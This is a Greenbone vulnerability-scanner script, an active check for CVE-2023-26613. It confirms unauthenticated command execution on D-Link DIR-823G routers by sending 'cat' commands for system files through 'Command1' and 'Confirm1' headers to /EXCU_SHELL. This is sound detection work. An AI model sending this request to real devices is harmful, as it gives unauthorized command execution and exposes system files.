# SPDX-FileCopyrightText: 2023 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.104824");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2023-07-06 15:03:24 +0000 (Thu, 06 Jul 2023)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2023-07-06 18:46:00 +0000 (Thu, 06 Jul 2023)");

  script_cve_id("CVE-2023-26613");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("D-Link DIR-823G 'EXCU_SHELL' RCE Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2023 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "httpver.nasl", "global_settings.nasl", "os_detection.nasl");
  # nb: No "more" specific mandatory keys because there might be different (branded) devices/vendors
  # affected as well...
  script_mandatory_keys("Host/runs_unixoide");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"https://github.com/726232111/VulIoT/tree/main/D-Link/DIR823G%20V1.0.2B05/excu_shell");

  script_tag(name:"summary", value:"D-Link DIR-823G Routers are prone to a remote code execution
  (RCE) vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The vulnerability exists within /EXCU_SHELL, which processes
  HTTP requests and performs any commands given to it on the target system with admin privileges.");

  script_tag(name:"impact", value:"Successful exploitation would give an attacker complete control
  over the target system.");

  script_tag(name:"affected", value:"D-Link DIR-823G Routers with firmware version 1.0.2B05 are
  known to be affected. Other devices and vendors might be affected as well.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since
  the disclosure of this vulnerability. Likely none will be provided anymore. General solution options
  are to upgrade to a newer release, disable respective features, remove the product or replace the
  product by another one.");

  exit(0);
}

# nb: This flaw is quite similar to:
# - 2018/dlink/gb_dlink_dwr_rce_vuln.nasl
# - gsf/2023/edgecore/gb_edgecore_CVE-2019-6288_active.nasl
# and just has different commands in the passed headers.

include("host_details.inc");
include("os_func.inc");
include("misc_func.inc");
include("traversal_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

port = http_get_port( default:80 );

url = "/EXCU_SHELL";

res = http_get_cache( port:port, item:url );
# nb:
# - Just a basic check as we have three active-VTs accessing the same endpoint
# - Only checking for 404 on purpose as we don't know if every affected target is e.g. responding
#   with a 200 status code
if( ! res || res =~ "^HTTP/1\.[01] 404" )
  exit( 0 );

files = traversal_files( "linux" );

foreach pattern( keys( files ) ) {

  file = files[pattern];
  cmd = "cat /" + file;
  add_headers = make_array( "Command1", cmd, "Confirm1", "apply" );

  req = http_get_req( port:port, url:url, add_headers:add_headers );
  res = http_keepalive_send_recv( port:port, data:req, bodyonly:TRUE );

  if( egrep( pattern:pattern, string:res, icase:FALSE ) ) {

    info["HTTP Method"] = "GET";
    info["Affected URL"] = http_report_vuln_url( port:port, url:url, url_only:TRUE );
    foreach header( keys( add_headers ) )
      info['HTTP "' + header + '" Header'] = add_headers[header];

    report  = 'By doing the following HTTP request:\n\n';
    report += text_format_table( array:info ) + '\n\n';
    report += "it was possible to execute the command '" + cmd + "' on the target.";
    report += '\n\nResult (truncated):\n\n' + substr( res, 0, 1500 );
    expert_info  = 'Request:\n\n' + req + '\n\nResponse:\n\n' + res + '\n\n';
    security_message( port:port, data:chomp( report ), expert_info:expert_info );

    exit( 0 );
  }
}

exit( 99 );
